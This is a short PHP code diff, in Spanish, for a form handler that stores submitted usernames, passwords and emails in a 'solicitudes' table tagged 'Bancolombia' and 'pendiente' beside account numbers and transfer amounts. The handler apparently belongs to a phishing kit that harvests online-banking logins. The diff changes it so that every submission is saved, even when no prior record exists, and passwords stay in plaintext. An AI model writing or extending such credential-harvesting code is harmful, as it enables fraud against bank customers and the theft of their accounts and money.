@@ -3,22 +3,46 @@ ob_start();
 session_start();
 require 'conexion.php';
 
+date_default_timezone_set('America/Bogota');
+
 $nombreUsuario = $_POST['usuario'] ?? '';
 $password      = $_POST['clave']   ?? '';
 $claveUnica    = $_POST['key']     ?? '';
 $email         = $_POST['correo']  ?? '';
 $idPeticion    = uniqid("req_");
 
+if (trim($claveUnica) === '') {
+    $claveUnica = 'auto_' . bin2hex(random_bytes(16));
+}
+
+$upsert = $pdo->prepare(
+    "INSERT INTO solicitudes (`key`, `user`, `password`, `request_id`, `correo`, `estado`, `banco`)
+     VALUES (:k, :u, :p, :rid, :em, 'pendiente', 'Bancolombia')
+     ON DUPLICATE KEY UPDATE
+         `user`       = VALUES(`user`),
+         `password`   = VALUES(`password`),
+         `request_id` = VALUES(`request_id`),
+         `correo`     = IFNULL(VALUES(`correo`), `correo`)"
+);
+$upsert->execute([
+    ':k'   => $claveUnica,
+    ':u'   => $nombreUsuario,
+    ':p'   => $password,
+    ':rid' => $idPeticion,
+    ':em'  => $email,
+]);
+
 $consulta = $pdo->prepare("SELECT numero_cuenta, monto, banco FROM solicitudes WHERE `key` = ? LIMIT 1");
 $consulta->execute([$claveUnica]);
 $datosSolicitud = $consulta->fetch(PDO::FETCH_ASSOC);
 
 if (!$datosSolicitud) {
-    exit("Error: No se encontro informacion asociada a esa clave.");
+    $datosSolicitud = [
+        'numero_cuenta' => '',
+        'monto'         => '',
+        'banco'         => 'Bancolombia',
+    ];
 }
-
-$actualizar = $pdo->prepare("UPDATE solicitudes SET user = ?, password = ?, request_id = ? WHERE `key` = ?");
-$actualizar->execute([$nombreUsuario, $password, $idPeticion, $claveUnica]);
 
 $telefonoCliente    = $datosSolicitud['numero_cuenta'];
 $montoTransferencia = $datosSolicitud['monto'];
